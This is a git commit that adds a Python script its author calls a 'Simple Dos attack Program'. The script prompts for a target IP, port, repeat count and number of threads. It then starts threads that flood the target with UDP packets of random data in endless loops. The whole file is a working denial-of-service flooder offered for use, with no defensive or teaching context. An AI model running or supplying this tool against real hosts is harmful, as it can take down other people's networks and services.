2664d8dae04d112e3ac8627e64d90d5914bb1bb4
gjjun <rlawnstjddl12@gmail.com>
2021-07-03 00:50:05 +0900

    Upload File
    Simple Dos attack Program

---
+++ JJ_ALPHA.py
@@ -0,0 +1,37 @@
+# CODE BY JS
+
+import random
+import socket
+import threading
+from colorama import Fore, init
+print(''' ═╦═ ═╦═   ╔═╗  ╦    ╦═╗  ╦ ╦  ╔═╗
+  ║   ║    ╠═╣  ║    ╠═╝  ╠═╣  ╠═╣
+ ═╝  ═╝    ╩ ╩  ╚══  ╩    ╩ ╩  ╩ ╩
+''')
+ip = str(input("Target IP : "))
+port = int(input("PORT : "))
+choice = "y",
+times = int(input("time(s) : "))
+threads = int(input("Threads : "))
+def run():
+	data = random._urandom(1025)
+	i = random.choice(("CODE BY JJ"," --> ATTACK"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"CODE BY JJ --> " + ip +" --> ATTACK !")
+		except:
+			print("CODE BY JJ --> " + ip + " ERROR !")
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run)
+		th.start()
+if __name__ == "__main__":
+    threading.main_thread
